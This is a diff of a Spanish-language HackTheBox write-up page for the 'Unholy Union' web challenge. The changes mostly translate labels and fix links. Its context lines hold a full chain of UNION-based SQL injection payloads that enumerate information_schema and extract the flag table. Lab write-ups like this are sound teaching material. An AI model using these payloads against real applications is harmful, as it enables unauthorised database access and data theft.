@@ -140,7 +140,7 @@
     .val-red    { color: var(--red); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -306,6 +306,10 @@
       body, a, button { cursor: auto; }
       .cursor, .cursor-ring { display: none; }
     }
+  
+    /* insignias normalizadas */
+    .badge-db{color:var(--yellow);background:rgba(255,215,0,.08);border-color:var(--yellow);}
+    .badge-muy-facil{color:var(--green);background:rgba(0,255,136,.1);border-color:var(--green);}
   </style>
 </head>
 <body>
@@ -316,30 +320,31 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
-      <span>unholy union</span>
-    </p>
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>unholy-union</span>
+    </div>
     <h1 class="writeup-title"><span>Unholy Union</span></h1>
-    <p class="writeup-subtitle">HackTheBox — Web Challenge · SQL Injection (UNION-Based) → Dump de información_schema → Flag</p>
+    <p class="writeup-subtitle">HackTheBox — Reto web · Inyección SQL (basada en UNION) → Volcado de information_schema → Flag</p>
     <div class="writeup-meta">
-      <span class="meta-badge badge-facil">● VERY EASY</span>
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-db">MARIADB</span>
       <span class="meta-badge badge-shell">WEB</span>
       <span class="meta-badge badge-sqli">SQL INJECTION</span>
-      <span class="meta-badge badge-linux">MARIADB</span>
-      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Junio 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -371,7 +376,7 @@
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Solved</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Inspección</span> → input de búsqueda concatenado a SQL</div></div>
         <div class="ap-line"></div>
@@ -400,7 +405,7 @@
         <p>
           <strong>Unholy Union</strong> es un reto de categoría <span class="hl-cyan">Web</span> de
           dificultad <span class="hl">Very Easy</span> en HackTheBox, diseñado específicamente para
-          enseñar y practicar <span class="hl-pur">SQL Injection basada en UNION</span>.
+          enseñar y practicar <span class="hl-pur">Inyección SQL basada en UNION</span>.
         </p>
         <p>
           La aplicación, un falso "Haunted Inventory Manager", expone un campo de búsqueda que
@@ -506,7 +511,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,5-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT <span class="arg">1,2,3,4,5</span>-- -</span></div>
       </div>
@@ -534,7 +539,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,@@version-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">@@version</span>-- -</span></div>
       </div>
@@ -565,7 +570,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,database()-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">database()</span>-- -</span></div>
       </div>
@@ -575,7 +580,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,user()-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">user()</span>-- -</span></div>
       </div>
@@ -593,7 +598,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,schema_name FROM information_schema.schemata-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">schema_name</span> FROM <span class="arg">information_schema.schemata</span>-- -</span></div>
       </div>
@@ -611,7 +616,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables WHERE table_schema=database()-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">table_name</span> FROM <span class="arg">information_schema.tables</span> WHERE <span class="arg">table_schema=database()</span>-- -</span></div>
       </div>
@@ -634,7 +639,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='inventory'-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">column_name</span> FROM <span class="arg">information_schema.columns</span> WHERE <span class="arg">table_schema=database()</span> AND <span class="arg">table_name='inventory'</span>-- -</span></div>
       </div>
@@ -644,7 +649,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='flag'-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">column_name</span> FROM <span class="arg">information_schema.columns</span> WHERE <span class="arg">table_schema=database()</span> AND <span class="arg">table_name='flag'</span>-- -</span></div>
       </div>
@@ -675,7 +680,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,flag FROM flag-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">flag</span> FROM <span class="arg">flag</span>-- -</span></div>
       </div>
@@ -701,7 +706,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="' UNION SELECT id,name,description,origin,created_at FROM inventory-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PAYLOAD</span>
         <div><span class="cmd">' UNION SELECT <span class="arg">id,name,description,origin,created_at</span> FROM <span class="arg">inventory</span>-- -</span></div>
       </div>
@@ -712,7 +717,7 @@
 
       <div class="info-box">
         <p class="info-box-title">// LECCIÓN DEL RETO</p>
-        <p>Este challenge ilustra el flujo canónico de una <strong>UNION-Based SQL Injection</strong>: (1) cerrar el contexto de la consulta original, (2) calibrar el número de columnas con enteros de prueba, (3) usar esas posiciones para filtrar contra <strong>information_schema</strong> y mapear la base de datos completa, y (4) pivotar hacia la tabla objetivo. Ninguna herramienta automatizada (sqlmap) fue necesaria — todo se resolvió manualmente desde la barra de búsqueda.</p>
+        <p>Este challenge ilustra el flujo canónico de una <strong>UNION-Based Inyección SQL</strong>: (1) cerrar el contexto de la consulta original, (2) calibrar el número de columnas con enteros de prueba, (3) usar esas posiciones para filtrar contra <strong>information_schema</strong> y mapear la base de datos completa, y (4) pivotar hacia la tabla objetivo. Ninguna herramienta automatizada (sqlmap) fue necesaria — todo se resolvió manualmente desde la barra de búsqueda.</p>
       </div>
     </div>
 
@@ -775,12 +780,12 @@
 
       <div class="glosario-grid">
         <div class="glos-card">
-          <div class="glos-term">SQL Injection (Inyección SQL)</div>
+          <div class="glos-term">Inyección SQL (Inyección SQL)</div>
           <div class="glos-def">Vulnerabilidad que ocurre cuando una aplicación concatena entrada del usuario directamente dentro de una consulta SQL sin sanitización ni uso de <strong>consultas parametrizadas</strong>. Permite a un atacante alterar la lógica de la consulta original para leer, modificar o eliminar datos arbitrarios.</div>
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">UNION-Based SQL Injection</div>
+          <div class="glos-term">UNION-Based Inyección SQL</div>
           <div class="glos-def">Técnica de explotación que aprovecha el operador <code>UNION</code> de SQL para combinar los resultados de una consulta maliciosa con los de la consulta original vulnerable, mostrando datos arbitrarios directamente en la respuesta de la aplicación — a diferencia de la inyección ciega, no requiere inferencia carácter por carácter.</div>
         </div>
 
@@ -811,9 +816,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Unholy Union · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
